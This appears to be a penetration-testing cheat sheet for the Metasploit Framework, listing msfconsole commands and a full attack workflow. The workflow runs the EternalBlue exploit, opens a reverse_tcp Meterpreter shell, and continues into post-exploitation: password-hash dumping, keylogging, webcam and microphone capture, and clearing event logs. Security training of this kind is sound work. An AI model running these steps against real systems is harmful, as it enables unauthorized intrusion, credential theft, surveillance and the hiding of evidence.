## **Metasploit Cheat Sheet**

**Description:**
The Metasploit Framework is an open-source penetration testing platform that provides a vast collection of exploits, payloads, auxiliary modules, encoders, and post-exploitation tools. It allows security professionals to simulate real-world attacks, identify vulnerabilities, validate security controls, and develop exploit code. Metasploit is highly modular, enabling users to combine various components to achieve specific penetration testing goals. Its primary interface is the `msfconsole`, an interactive command-line environment.

**Key Components:**
* **Exploits:** Code that targets specific vulnerabilities in systems or applications to gain unauthorized access.
* **Payloads:** Malicious code that is delivered by an exploit and executed on the compromised target (often generated with `msfvenom`).
* **Auxiliary Modules:** Tools for various tasks like scanning, fuzzing, network sniffing, and information gathering, without necessarily exploiting a vulnerability.
* **Post-Exploitation Modules:** Used to gather more information, maintain access, or escalate privileges on a compromised system.
* **Encoders:** Used to obfuscate payloads to bypass security measures.
* **Nops:** No-operation instructions used to create space in memory for shellcode.

**Common `msfconsole` Commands:**

1.  **Start Metasploit Console:**
    ```bash
    msfconsole
    ```

2.  **Search for Modules:**
    ```bash
    search <keyword>
    ```
    *Example: `search eternalblue`, `search apache`*

3.  **Use a Module (Exploit, Auxiliary, Post):**
    ```bash
    use <module_path>
    ```
    *Example: `use exploit/windows/smb/ms17_010_eternalblue`*
    *Example: `use auxiliary/scanner/smb/smb_version`*

4.  **Show Options for the Current Module:**
    ```bash
    show options
    ```
    *Displays configurable options (e.g., RHOST, LPORT, PAYLOAD) for the selected module.*

5.  **Set a Module Option:**
    ```bash
    set <option_name> <value>
    ```
    *Example: `set RHOSTS 192.168.1.100`*
    *Example: `set LHOST 192.168.1.5`*
    *Example: `set LPORT 4444`*

6.  **Set a Global Option (persists across module changes):**
    ```bash
    setg <option_name> <value>
    ```
    *Example: `setg LHOST 192.168.1.5`*

7.  **Show Payloads for an Exploit:**
    ```bash
    show payloads
    ```
    *After selecting an exploit, shows compatible payloads.*

8.  **Set a Payload:**
    ```bash
    set PAYLOAD <payload_path>
    ```
    *Example: `set PAYLOAD windows/meterpreter/reverse_tcp`*

9.  **Show Targets for an Exploit:**
    ```bash
    show targets
    ```
    *Displays a list of supported target operating systems or service packs for the exploit.*

10. **Set a Target:**
    ```bash
    set TARGET <target_number>
    ```
    *Example: `set TARGET 0` (selects the first target if available)*

11. **Check if a Target is Vulnerable (for some modules):**
    ```bash
    check
    ```

12. **Run the Exploit/Module:**
    ```bash
    exploit
    ```
    *Alias: `run`*

13. **Run Exploit in Background:**
    ```bash
    exploit -j
    ```
    *Runs the exploit as a job, allowing you to continue using the console.*

14. **List Active Sessions:**
    ```bash
    sessions -l
    ```

15. **Interact with a Session:**
    ```bash
    sessions -i <session_id>
    ```
    *Example: `sessions -i 1`*

16. **Background the Current Session:**
    ```bash
    background
    ```

17. **Meterpreter Commands (after gaining a Meterpreter session):**
    * `help`: Displays Meterpreter commands.
    * `sysinfo`: Displays system information.
    * `getuid`: Displays current user ID.
    * `pwd`: Print working directory on the target.
    * `ls`: List files in the current directory.
    * `cd <directory>`: Change directory.
    * `download <remote_file> <local_path>`: Download a file.
    * `upload <local_file> <remote_path>`: Upload a file.
    * `shell`: Drop into a native command shell (e.g., `cmd.exe`, `bash`).
    * `migrate <PID>`: Migrate Meterpreter to another process.
    * `getprivs`: Attempt to get all privileges.
    * `hashdump`: Dump password hashes (Windows).
    * `screenshot`: Take a screenshot of the target desktop.
    * `webcam_snap`: Take a picture from the webcam.
    * `record_mic`: Record audio from the microphone.
    * `keyscan_start`/`keyscan_dump`/`keyscan_stop`: Start/dump/stop keyboard logging.
    * `clearev`: Clear event logs (Windows).
    * `ps`: List running processes.
    * `kill <PID>`: Kill a process.

18. **Exit Metasploit:**
    ```bash
    exit
    ```

**General Workflow:**

1.  **Information Gathering/Reconnaissance:** Use auxiliary modules or external tools to gather information about the target (e.g., open ports, services, OS versions).
    * `search scanner`
    * `use auxiliary/scanner/portscan/tcp`
    * `set RHOSTS <target_IP>`
    * `run`

2.  **Vulnerability Identification:** Based on reconnaissance, identify potential vulnerabilities.
    * `search <vulnerability_name>`

3.  **Exploit Selection:** Choose an appropriate exploit module for the identified vulnerability.
    * `use exploit/windows/smb/ms17_010_eternalblue`

4.  **Payload Selection:** Choose a payload that aligns with your goals (e.g., `meterpreter/reverse_tcp` for interactive control).
    * `set PAYLOAD windows/meterpreter/reverse_tcp`

5.  **Configure Options:** Set `RHOSTS`, `LHOST`, `LPORT`, and any other required options.
    * `show options`
    * `set RHOSTS <target_IP>`
    * `set LHOST <your_IP>`
    * `set LPORT <your_port>`

6.  **Execute Exploit:**
    * `exploit`

7.  **Post-Exploitation:** Once a session is established (e.g., Meterpreter), use post-exploitation modules to further compromise the system, escalate privileges, or move laterally.
    * `use post/windows/gather/smart_hashdump`
    * `set SESSION <session_id>`
    * `run`